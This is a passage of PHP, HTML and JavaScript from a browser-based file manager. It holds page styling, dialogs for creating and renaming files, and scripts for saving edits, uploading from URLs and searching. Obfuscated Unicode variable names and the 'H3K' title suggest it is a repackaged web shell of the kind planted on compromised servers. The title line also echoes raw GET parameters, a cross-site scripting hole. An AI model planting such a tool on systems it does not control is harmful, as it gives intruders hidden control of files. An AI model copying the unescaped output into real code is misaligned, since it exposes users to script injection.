echo (isset($_GET['view']) ? $_GET['view'] : ((isset($_GET['edit'])) ? $_GET['edit'] : "H3K")); ?></title>
        <?php 
print_external('pre-jsdelivr'); ?>
        <?php 
print_external('pre-cloudflare'); ?>
        <?php 
print_external('css-bootstrap'); ?>
        <?php 
print_external('css-font-awesome'); ?>
        <?php 
if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
            <?php 
print_external('css-highlightjs'); ?>
        <?php 
endif; ?>
        <script type="text/javascript">
            window.csrf = '<?php 
echo $_SESSION['token']; ?>';
        </script>
        <style>
            html {
                -moz-osx-font-smoothing: grayscale;
                -webkit-font-smoothing: antialiased;
                text-rendering: optimizeLegibility;
                height: 100%;
                scroll-behavior: smooth;
            }

            *,
            *::before,
            *::after {
                box-sizing: border-box;
            }

            body {
                font-size: 15px;
                color: #222;
                background: #F7F7F7;
            }

            body.navbar-fixed {
                margin-top: 55px;
            }

            a,
            a:hover,
            a:visited,
            a:focus {
                text-decoration: none !important;
            }

            .filename,
            td,
            th {
                white-space: nowrap
            }

            .navbar-brand {
                font-weight: bold;
            }

            .nav-item.avatar a {
                cursor: pointer;
                text-transform: capitalize;
            }

            .nav-item.avatar a>i {
                font-size: 15px;
            }

            .nav-item.avatar .dropdown-menu a {
                font-size: 13px;
            }

            #search-addon {
                font-size: 12px;
                border-right-width: 0;
            }

            .brl-0 {
                background: transparent;
                border-left: 0;
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }

            .brr-0 {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }

            .bread-crumb {
                color: #cccccc;
                font-style: normal;
            }

            #main-table {
                transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1), width 0s .25s;
            }

            #main-table .filename a {
                color: #222222;
            }

            .table td,
            .table th {
                vertical-align: middle !important;
            }

            .table .custom-checkbox-td .custom-control.custom-checkbox,
            .table .custom-checkbox-header .custom-control.custom-checkbox {
                min-width: 18px;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            .table-sm td,
            .table-sm th {
                padding: .4rem;
            }

            .table-bordered td,
            .table-bordered th {
                border: 1px solid #f1f1f1;
            }

            .hidden {
                display: none
            }

            pre.with-hljs {
                padding: 0;
                overflow: hidden;
            }

            pre.with-hljs code {
                margin: 0;
                border: 0;
                overflow: scroll;
            }

            code.maxheight,
            pre.maxheight {
                max-height: 512px
            }

            .fa.fa-caret-right {
                font-size: 1.2em;
                margin: 0 4px;
                vertical-align: middle;
                color: #ececec
            }

            .fa.fa-home {
                font-size: 1.3em;
                vertical-align: bottom
            }

            .path {
                margin-bottom: 10px
            }

            form.dropzone {
                min-height: 200px;
                border: 2px dashed #007bff;
                line-height: 6rem;
            }

            .right {
                text-align: right
            }

            .center,
            .close,
            .login-form,
            .preview-img-container {
                text-align: center
            }

            .message {
                padding: 4px 7px;
                border: 1px solid #ddd;
                background-color: #fff
            }

            .message.ok {
                border-color: green;
                color: green
            }

            .message.error {
                border-color: red;
                color: red
            }

            .message.alert {
                border-color: orange;
                color: orange
            }

            .preview-img {
                max-width: 100%;
                max-height: 80vh;
                background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);
                cursor: zoom-in
            }

            input#preview-img-zoomCheck[type=checkbox] {
                display: none
            }

            input#preview-img-zoomCheck[type=checkbox]:checked~label>img {
                max-width: none;
                max-height: none;
                cursor: zoom-out
            }

            .inline-actions>a>i {
                font-size: 1em;
                margin-left: 5px;
                background: #3785c1;
                color: #fff;
                padding: 3px 4px;
                border-radius: 3px;
            }

            .preview-video {
                position: relative;
                max-width: 100%;
                height: 0;
                padding-bottom: 62.5%;
                margin-bottom: 10px
            }

            .preview-video video {
                position: absolute;
                width: 100%;
                height: 100%;
                left: 0;
                top: 0;
                background: #000
            }

            .compact-table {
                border: 0;
                width: auto
            }

            .compact-table td,
            .compact-table th {
                width: 100px;
                border: 0;
                text-align: center
            }

            .compact-table tr:hover td {
                background-color: #fff
            }

            .filename {
                max-width: 420px;
                overflow: hidden;
                text-overflow: ellipsis
            }

            .break-word {
                word-wrap: break-word;
                margin-left: 30px
            }

            .break-word.float-left a {
                color: #7d7d7d
            }

            .break-word+.float-right {
                padding-right: 30px;
                position: relative
            }

            .break-word+.float-right>a {
                color: #7d7d7d;
                font-size: 1.2em;
                margin-right: 4px
            }

            #editor {
                position: absolute;
                right: 15px;
                top: 100px;
                bottom: 15px;
                left: 15px
            }

            @media (max-width:481px) {
                #editor {
                    top: 150px;
                }
            }

            #normal-editor {
                border-radius: 3px;
                border-width: 2px;
                padding: 10px;
                outline: none;
            }

            .btn-2 {
                padding: 4px 10px;
                font-size: small;
            }

            li.file:before,
            li.folder:before {
                font: normal normal normal 14px/1 FontAwesome;
                content: "\f016";
                margin-right: 5px
            }

            li.folder:before {
                content: "\f114"
            }

            i.fa.fa-folder-o {
                color: #0157b3
            }

            i.fa.fa-picture-o {
                color: #26b99a
            }

            i.fa.fa-file-archive-o {
                color: #da7d7d
            }

            .btn-2 i.fa.fa-file-archive-o {
                color: inherit
            }

            i.fa.fa-css3 {
                color: #f36fa0
            }

            i.fa.fa-file-code-o {
                color: #007bff
            }

            i.fa.fa-code {
                color: #cc4b4c
            }

            i.fa.fa-file-text-o {
                color: #0096e6
            }

            i.fa.fa-html5 {
                color: #d75e72
            }

            i.fa.fa-file-excel-o {
                color: #09c55d
            }

            i.fa.fa-file-powerpoint-o {
                color: #f6712e
            }

            i.go-back {
                font-size: 1.2em;
                color: #007bff;
            }

            .main-nav {
                padding: 0.2rem 1rem;
                box-shadow: 0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)
            }

            .dataTables_filter {
                display: none;
            }

            table.dataTable thead .sorting {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC');
            }

            table.dataTable thead .sorting_asc {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg==');
            }

            table.dataTable thead .sorting_desc {
                cursor: pointer;
                background-repeat: no-repeat;
                background-position: center right;
                background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII=');
            }

            table.dataTable thead tr:first-child th.custom-checkbox-header:first-child {
                background-image: none;
            }

            .footer-action li {
                margin-bottom: 10px;
            }

            .app-v-title {
                font-size: 24px;
                font-weight: 300;
                letter-spacing: -.5px;
                text-transform: uppercase;
            }

            hr.custom-hr {
                border-top: 1px dashed #8c8b8b;
                border-bottom: 1px dashed #fff;
            }

            #snackbar {
                visibility: hidden;
                min-width: 250px;
                margin-left: -125px;
                background-color: #333;
                color: #fff;
                text-align: center;
                border-radius: 2px;
                padding: 16px;
                position: fixed;
                z-index: 1;
                left: 50%;
                bottom: 30px;
                font-size: 17px;
            }

            #snackbar.show {
                visibility: visible;
                -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
                animation: fadein 0.5s, fadeout 0.5s 2.5s;
            }

            @-webkit-keyframes fadein {
                from {
                    bottom: 0;
                    opacity: 0;
                }

                to {
                    bottom: 30px;
                    opacity: 1;
                }
            }

            @keyframes fadein {
                from {
                    bottom: 0;
                    opacity: 0;
                }

                to {
                    bottom: 30px;
                    opacity: 1;
                }
            }

            @-webkit-keyframes fadeout {
                from {
                    bottom: 30px;
                    opacity: 1;
                }

                to {
                    bottom: 0;
                    opacity: 0;
                }
            }

            @keyframes fadeout {
                from {
                    bottom: 30px;
                    opacity: 1;
                }

                to {
                    bottom: 0;
                    opacity: 0;
                }
            }

            #main-table span.badge {
                border-bottom: 2px solid #f8f9fa
            }

            #main-table span.badge:nth-child(1) {
                border-color: #df4227
            }

            #main-table span.badge:nth-child(2) {
                border-color: #f8b600
            }

            #main-table span.badge:nth-child(3) {
                border-color: #00bd60
            }

            #main-table span.badge:nth-child(4) {
                border-color: #4581ff
            }

            #main-table span.badge:nth-child(5) {
                border-color: #ac68fc
            }

            #main-table span.badge:nth-child(6) {
                border-color: #45c3d2
            }

            @media only screen and (min-device-width:768px) 
 {
                .navbar-collapse .col-xs-6 {
                    padding: 0;
                }
            }

            .btn.active.focus,
            .btn.active:focus,
            .btn.focus,
            .btn.focus:active,
            .btn:active:focus,
            .btn:focus {
                outline: 0 !important;
                outline-offset: 0 !important;
                background-image: none !important;
                -webkit-box-shadow: none !important;
                box-shadow: none !important
            }

            .lds-facebook {
                display: none;
                position: relative;
                width: 64px;
                height: 64px
            }

            .lds-facebook div,
            .lds-facebook.show-me {
                display: inline-block
            }

            .lds-facebook div {
                position: absolute;
                left: 6px;
                width: 13px;
                background: #007bff;
                animation: lds-facebook 1.2s cubic-bezier(0, .5, .5, 1) infinite
            }

            .lds-facebook div:nth-child(1) {
                left: 6px;
                animation-delay: -.24s
            }

            .lds-facebook div:nth-child(2) {
                left: 26px;
                animation-delay: -.12s
            }

            .lds-facebook div:nth-child(3) {
                left: 45px;
                animation-delay: 0s
            }

            @keyframes lds-facebook {
                0% {
                    top: 6px;
                    height: 51px
                }

                100%,
                50% {
                    top: 19px;
                    height: 26px
                }
            }

            ul#search-wrapper {
                padding-left: 0;
                border: 1px solid #ecececcc;
            }

            ul#search-wrapper li {
                list-style: none;
                padding: 5px;
                border-bottom: 1px solid #ecececcc;
            }

            ul#search-wrapper li:nth-child(odd) {
                background: #f9f9f9cc;
            }

            .c-preview-img {
                max-width: 300px;
            }

            .border-radius-0 {
                border-radius: 0;
            }

            .float-right {
                float: right;
            }

            .table-hover>tbody>tr:hover>td:first-child {
                border-left: 1px solid #1b77fd;
            }

            #main-table tr.even {
                background-color: #F8F9Fa;
            }

            .filename>a>i {
                margin-right: 3px;
            }

            .fs-7 {
                font-size: 14px;
            }
        </style>
        <?php

        if (FM_THEME == "dark"): ?>
            <style>
                :root {
                    --bs-bg-opacity: 1;
                    --bg-color: #f3daa6;
                    --bs-dark-rgb: 28, 36, 41 !important;
                    --bs-bg-opacity: 1;
                }

                body.theme-dark {
                    background-image: linear-gradient(90deg, #1c2429, #263238);
                    color: #CFD8DC;
                }

                .list-group .list-group-item {
                    background: #343a40;
                }

                .theme-dark .navbar-nav i,
                .navbar-nav .dropdown-toggle,
                .break-word {
                    color: #CFD8DC;
                }

                a,
                a:hover,
                a:visited,
                a:active,
                #main-table .filename a,
                i.fa.fa-folder-o,
                i.go-back {
                    color: var(--bg-color);
                }

                ul#search-wrapper li:nth-child(odd) {
                    background: #212a2f;
                }

                .theme-dark .btn-outline-primary {
                    color: #b8e59c;
                    border-color: #b8e59c;
                }

                .theme-dark .btn-outline-primary:hover,
                .theme-dark .btn-outline-primary:active {
                    background-color: #2d4121;
                }

                .theme-dark input.form-control {
                    background-color: #101518;
                    color: #CFD8DC;
                }

                .theme-dark .dropzone {
                    background: transparent;
                }

                .theme-dark .inline-actions>a>i {
                    background: #79755e;
                }

                .theme-dark .text-white {
                    color: #CFD8DC !important;
                }

                .theme-dark .table-bordered td,
                .table-bordered th {
                    border-color: #343434;
                }

                .theme-dark .table-bordered td .custom-control-input,
                .theme-dark .table-bordered th .custom-control-input {
                    opacity: 0.678;
                }

                .message {
                    background-color: #212529;
                }

                form.dropzone {
                    border-color: #79755e;
                }
            </style>
        <?php 
endif; ?>
    </head>

    <body class="<?php 
echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php 
echo $γΌγµ•ΌγΌγΈ¦; ?>">
        <div id="wrapper" class="container-fluid">
            <!-- New Item creation -->
            <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog" role="document">
                    <form class="modal-content" method="post">
                        <div class="modal-header">
                            <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php 
echo lng('CreateNewItem') ?></h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <p><label for="newfile"><?php 
echo lng('ItemType') ?> </label></p>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                                <label class="form-check-label" for="customRadioInline1"><?php 
echo lng('File') ?></label>
                            </div>
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                                <label class="form-check-label" for="customRadioInline2"><?php 
echo lng('Folder') ?></label>
                            </div>

                            <p class="mt-3"><label for="newfilename"><?php 
echo lng('ItemName') ?> </label></p>
                            <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php 
echo lng('Enter here...') ?>" required>
                        </div>
                        <div class="modal-footer">
                            <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                            <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></button>
                            <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('CreateNow') ?></button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Advance Search Modal -->
            <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog modal-lg" role="document">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title col-10" id="searchModalLabel">
                                <div class="input-group mb-3">
                                    <input type="text" class="form-control" placeholder="<?php 
echo lng('Search') ?> <?php 
echo lng('a files') ?>" aria-label="<?php 
echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                                    <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                                </div>
                            </h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <form action="" method="post">
                                <div class="lds-facebook">
                                    <div></div>
                                    <div></div>
                                    <div></div>
                                </div>
                                <ul id="search-wrapper">
                                    <p class="m-2"><?php 
echo lng('Search file in folder and subfolders...') ?></p>
                                </ul>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!--Rename Modal -->
            <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <div class="modal-dialog" role="document">
                    <form class="modal-content rounded-3 shadow" method="post" autocomplete="off">
                        <div class="modal-body p-4 text-center">
                            <h5 class="mb-3"><?php 
echo lng('Are you sure want to rename?') ?></h5>
                            <p class="mb-1">
                                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php 
echo lng('Enter new file name') ?>" required>
                                <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                                <input type="hidden" name="rename_from" id="js-rename-from">
                            </p>
                        </div>
                        <div class="modal-footer flex-nowrap p-0">
                            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php 
echo lng('Cancel') ?></button>
                            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php 
echo lng('Okay') ?></strong></button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Confirm Modal -->
            <script type="text/html" id="js-tpl-confirm">
                <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>" data-bs-theme="<?php 
echo FM_THEME; ?>">
                    <div class="modal-dialog" role="document">
                        <form class="modal-content rounded-3 shadow" method="post" autocomplete="off" action="<%this.action%>">
                            <div class="modal-body p-4 text-center">
                                <h5 class="mb-2"><?php 
echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
                                <p class="mb-1"><%this.content%></p>
                            </div>
                            <div class="modal-footer flex-nowrap p-0">
                                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php 
echo lng('Cancel') ?></button>
                                <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php 
echo lng('Okay') ?></strong></button>
                            </div>
                        </form>
                    </div>
                </div>
            </script>
        <?php

    }

    /**
     * Show page footer after login
     */
    function fm_show_footer()
    {
        ?>
        </div>
        <?php 
print_external('js-jquery'); ?>
        <?php 
print_external('js-bootstrap'); ?>
        <?php 
print_external('js-jquery-datatables'); ?>
        <?php 
if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
            <?php 
print_external('js-highlightjs'); ?>
            <script>
                hljs.highlightAll();
                var isHighlightingEnabled = true;
            </script>
        <?php 
endif; ?>
        <script>
            function template(html, options) {
                var re = /<\%([^\%>]+)?\%>/g,
                    reExp = /(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,
                    code = 'var r=[];\n',
                    cursor = 0,
                    match;
                var add = function(line, js) {
                    js ? (code += line.match(reExp) ? line + '\n' : 'r.push(' + line + ');\n') : (code += line != '' ? 'r.push("' + line.replace(/"/g, '\\"') + '");\n' : '');
                    return add
                }
                while (match = re.exec(html)) {
                    add(html.slice(cursor, match.index))(match[1], !0);
                    cursor = match.index + match[0].length
                }
                add(html.substr(cursor, html.length - cursor));
                code += 'return r.join("");';
                return new Function(code.replace(/[\r\t\n]/g, '')).apply(options)
            }

            function rename(e, t) {
                if (t) {
                    $("#js-rename-from").val(t);
                    $("#js-rename-to").val(t);
                    $("#renameDailog").modal('show');
                }
            }

            function change_checkboxes(e, t) {
                for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked
            }

            function get_checkboxes() {
                for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--)(e[n].type = "checkbox") && t.push(e[n]);
                return t
            }

            function select_all() {
                change_checkboxes(get_checkboxes(), !0)
            }

            function unselect_all() {
                change_checkboxes(get_checkboxes(), !1)
            }

            function invert_all() {
                change_checkboxes(get_checkboxes())
            }

            function checkbox_toggle() {
                var e = get_checkboxes();
                e.push(this), change_checkboxes(e)
            }

            // Create file backup with .bck
            function backup(e, t) {
                var n = new XMLHttpRequest,
                    a = "path=" + e + "&file=" + t + "&token=" + window.csrf + "&type=backup&ajax=true";
                return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function() {
                    4 == n.readyState && 200 == n.status && toast(n.responseText)
                }, n.send(a), !1
            }

            // Toast message
            function toast(txt) {
                var x = document.getElementById("snackbar");
                x.innerHTML = txt;
                x.className = "show";
                setTimeout(function() {
                    x.className = x.className.replace("show", "");
                }, 3000);
            }

            // Save file
            function edit_save(e, t) {
                var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
                if (typeof n !== 'undefined' && n !== null) {
                    if (true) {
                        var data = {
                            ajax: true,
                            content: n,
                            type: 'save',
                            token: window.csrf
                        };

                        $.ajax({
                            type: "POST",
                            url: window.location,
                            data: JSON.stringify(data),
                            contentType: "application/json; charset=utf-8",
                            success: function(mes) {
                                toast("Saved Successfully");
                                window.onbeforeunload = function() {
                                    return
                                }
                            },
                            failure: function(mes) {
                                toast("Error: try again");
                            },
                            error: function(mes) {
                                toast(`<p style="background-color:red">${mes.responseText}</p>`);
                            }
                        });
                    } else {
                        var a = document.createElement("form");
                        a.setAttribute("method", "POST"), a.setAttribute("action", "");
                        var o = document.createElement("textarea");
                        o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                        let cx = document.createElement("input");
                        cx.setAttribute("type", "hidden");
                        cx.setAttribute("name", "token");
                        cx.setAttribute("value", window.csrf);
                        var c = document.createTextNode(n);
                        o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
                    }
                }
            }

            function show_new_pwd() {
                $(".js-new-pwd").toggleClass('hidden');
            }

            // Save Settings
            function save_settings($this) {
                let form = $($this);
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            window.location.reload();
                        }
                    }
                });
                return false;
            }

            //Create new password hash
            function new_password_hash($this) {
                let form = $($this),
                    $pwd = $("#js-pwd-result");
                $pwd.val('');
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    success: function(data) {
                        if (data) {
                            $pwd.val(data);
                        }
                    }
                });
                return false;
            }

            // Upload files using URL @param {Object}
            function upload_from_url($this) {
                let form = $($this),
                    resultWrapper = $("div#js-url-upload__list");
                $.ajax({
                    type: form.attr('method'),
                    url: form.attr('action'),
                    data: form.serialize() + "&token=" + window.csrf + "&ajax=" + true,
                    beforeSend: function() {
                        form.find("input[name=uploadurl]").attr("disabled", "disabled");
                        form.find("button").hide();
                        form.find(".lds-facebook").addClass('show-me');
                    },
                    success: function(data) {
                        if (data) {
                            data = JSON.parse(data);
                            if (data.done) {
                                resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: ' + data.done.name + '</div>');
                                form.find("input[name=uploadurl]").val('');
                            } else if (data['fail']) {
                                resultWrapper.append('<div class="alert alert-danger row">Error: ' + data.fail.message + '</div>');
                            }
                            form.find("input[name=uploadurl]").removeAttr("disabled");
                            form.find("button").show();
                            form.find(".lds-facebook").removeClass('show-me');
                        }
                    },
                    error: function(xhr) {
                        form.find("input[name=uploadurl]").removeAttr("disabled");
                        form.find("button").show();
                        form.find(".lds-facebook").removeClass('show-me');
                        console.error(xhr);
                    }
                });
                return false;
            }

            // Search template
            function search_template(data) {
                var response = "";
                $.each(data, function(key, val) {
                    response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
                });
                return response;
            }

            // Advance search
            function fm_search() {
                var searchTxt = $("input#advanced-search").val(),
                    searchWrapper = $("ul#search-wrapper"),
                    path = $("#js-search-modal").attr("href"),
                    _html = "",
                    $loader = $("div.lds-facebook");
                if (!!searchTxt && searchTxt.length > 2 && path) {
                    var data = {
                        ajax: true,
                        content: searchTxt,
                        path: path,
                        type: 'search',
                        token: window.csrf
                    };
                    $.ajax({
                        type: "POST",
                        url: window.location,
                        data: data,
                        beforeSend: function() {
                            searchWrapper.html('');
                            $loader.addClass('show-me');
                        },
                        success: function(data) {
                            $loader.removeClass('show-me');
                            data = JSON.parse(data);
                            if (data && data.length) {
                                _html = search_template(data);
                                searchWrapper.html(_html);
                            } else {
                                searchWrapper.html('<p class="m-2">No result found!<p>');
                            }
                        },
                        error: function(xhr) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');
                        },
                        failure: function(mes) {
                            $loader.removeClass('show-me');
                            searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');
                        }
                    });
                } else {
                    searchWrapper.html("OOPS: minimum 3 characters required!");
                }
            }

            // action confirm dailog modal
            function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
                e.preventDefault();
                const tplObj = {
                    id,
                    title,
                    content: decodeURIComponent(content.replace(/\+/g, ' ')),
                    action
                };
                let tpl = $("#js-tpl-confirm").html();
                $(".modal.confirmDailog").remove();
                $('#wrapper').append(template(tpl, tplObj));
                const $confirmDailog = $("#confirmDailog-" + tplObj.id);
                $confirmDailog.modal('show');
                return false;
            }

            // on mouse hover image preview
            ! function(s) {
                s.previewImage = function(e) {
                    var o = s(document),
                        t = ".previewImage",
                        a = s.extend({
                            xOffset: 20,
                            yOffset: -20,
                            fadeIn: "fast",
                            css: {
                                padding: "5px",
                                border: "1px solid #cccccc",
                                "background-color": "#fff"
                            },
                            eventSelector: "[data-preview-image]",
                            dataKey: "previewImage",
                            overlayId: "preview-image-plugin-overlay"
                        }, e);
                    return o.off(t), o.on("mouseover" + t, a.eventSelector, function(e) {
                        s("p#" + a.overlayId).remove();
                        var o = s("<p>").attr("id", a.overlayId).css("position", "absolute").css("display", "none").append(s('<img class="c-preview-img">').attr("src", s(this).data(a.dataKey)));
                        a.css && o.css(a.css), s("body").append(o), o.css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px").fadeIn(a.fadeIn)
                    }), o.on("mouseout" + t, a.eventSelector, function() {
                        s("#" + a.overlayId).remove()
                    }), o.on("mousemove" + t, a.eventSelector, function(e) {
                        s("#" + a.overlayId).css("top", e.pageY + a.yOffset + "px").css("left", e.pageX + a.xOffset + "px")
                    }), this
                }, s.previewImage()
            }(jQuery);

            // Dom Ready Events
            $(document).ready(function() {
                // dataTable init
                var $table = $('#main-table'),
                    tableLng = $table.find('th').length,
                    _targets = (tableLng && tableLng == 7) ? [0, 4, 5, 6] : tableLng == 5 ? [0, 4] : [3];
                mainTable = $('#main-table').DataTable({
                    paging: false,
                    info: false,
                    order: [],
                    columnDefs: [{
                        targets: _targets,
                        orderable: false
                    }]
                });

                // filter table
                $('#search-addon').on('keyup', function() {
                    mainTable.search(this.value).draw();
                });

                $("input#advanced-search").on('keyup', function(e) {
                    if (e.keyCode === 13) {
                        fm_search();
                    }
                });

                $('#search-addon3').on('click', function() {
                    fm_search();
                });

                //upload nav tabs
                $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e) {
                    e.preventDefault();
                    let target = $(this).data('target');
                    $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');
                    $(this).addClass('active');
                    $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');
                    $(target).removeClass('hidden');
                });
            });
        </script>

        <?php 
if (isset($_GET['edit']) && isset($_GET['env']) && FM_EDIT_FILE && !FM_READONLY):
            $γγγ‚‚‚γ«‚γ‰‰Όγο = pathinfo($_GET["edit"], PATHINFO_EXTENSION);
            $γγγ‚‚‚γ«‚γ‰‰Όγο =  $γγγ‚‚‚γ«‚γ‰‰Όγο == "js" ? "javascript" :  $γγγ‚‚‚γ«‚γ‰‰Όγο;
        ?>
            <?php 
print_external('js-ace'); ?>
            <script>
                var editor = ace.edit("editor");
                editor.getSession().setMode({
                    path: "ace/mode/<?php 
echo $γγγ‚‚‚γ«‚γ‰‰Όγο; ?>",
                    inline: true
                });
                //editor.setTheme("ace/theme/twilight"); // Dark Theme
                editor.setShowPrintMargin(false); // Hide the vertical ruler
                function ace_commend(cmd) {
                    editor.commands.exec(cmd, editor);
                }
                editor.commands.addCommands([{
                    name: 'save',
                    bindKey: {
                        win: 'Ctrl-S',
                        mac: 'Command-S'
                    },
                    exec: function(editor) {
                        edit_save(this, 'ace');
                    }
                }]);

                function renderThemeMode() {
                    var $modeEl = $("select#js-ace-mode"),
                        $themeEl = $("select#js-ace-theme"),
                        $fontSizeEl = $("select#js-ace-fontSize"),
                        optionNode = function(type, arr) {
                            var $Option = "";
                            $.each(arr, function(i, val) {
                                $Option += "<option value='" + type + i + "'>" + val + "</option>";
                            });
                            return $Option;
                        },
                        _data = {
                            "aceTheme": {
                                "bright": {
                                    "chrome": "Chrome",
                                    "clouds": "Clouds",
                                    "crimson_editor": "Crimson Editor",
                                    "dawn": "Dawn",
                                    "dreamweaver": "Dreamweaver",
                                    "eclipse": "Eclipse",
                                    "github": "GitHub",
                                    "iplastic": "IPlastic",
                                    "solarized_light": "Solarized Light",
                                    "textmate": "TextMate",
                                    "tomorrow": "Tomorrow",
                                    "xcode": "XCode",
                                    "kuroir": "Kuroir",
                                    "katzenmilch": "KatzenMilch",
                                    "sqlserver": "SQL Server"
                                },
                                "dark": {
                                    "ambiance": "Ambiance",
                                    "chaos": "Chaos",
                                    "clouds_midnight": "Clouds Midnight",
                                    "dracula": "Dracula",
                                    "cobalt": "Cobalt",
                                    "gruvbox": "Gruvbox",
                                    "gob": "Green on Black",
                                    "idle_fingers": "idle Fingers",
                                    "kr_theme": "krTheme",
                                    "merbivore": "Merbivore",
                                    "merbivore_soft": "Merbivore Soft",
                                    "mono_industrial": "Mono Industrial",
                                    "monokai": "Monokai",
                                    "pastel_on_dark": "Pastel on dark",
                                    "solarized_dark": "Solarized Dark",
                                    "terminal": "Terminal",
